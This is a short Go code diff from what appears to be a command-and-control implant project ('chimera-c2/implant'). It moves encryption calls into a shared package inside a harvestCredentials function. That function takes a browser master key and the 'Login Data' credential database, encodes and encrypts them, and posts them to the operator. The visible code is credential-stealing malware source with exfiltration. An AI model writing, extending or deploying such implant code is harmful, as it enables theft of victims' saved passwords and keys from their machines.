@@ -9,6 +9,7 @@ import (
 	"path/filepath"
 	"unsafe"
 
+	"github.com/terancebana/chimera-c2/implant/internal/common"
 	"golang.org/x/sys/windows"
 )
 
@@ -27,7 +28,7 @@ func harvestCredentials() {
 		res := Result{Type: "file", Filename: "master_key.bin", Data: base64.StdEncoding.EncodeToString(masterKey)}
 		jsonResult, err := json.Marshal(res)
 		if err == nil {
-			encryptedResult, err := Encrypt(string(jsonResult))
+			encryptedResult, err := common.Encrypt(string(jsonResult))
 			if err == nil {
 				postResult(encryptedResult)
 			} else {
@@ -56,7 +57,7 @@ func harvestCredentials() {
 				res := Result{Type: "file", Filename: "Login Data", Data: base64.StdEncoding.EncodeToString(dbData)}
 				jsonResult, err := json.Marshal(res)
 				if err == nil {
-					encryptedResult, err := Encrypt(string(jsonResult))
+					encryptedResult, err := common.Encrypt(string(jsonResult))
 					if err == nil {
 						postResult(encryptedResult)
 					} else {
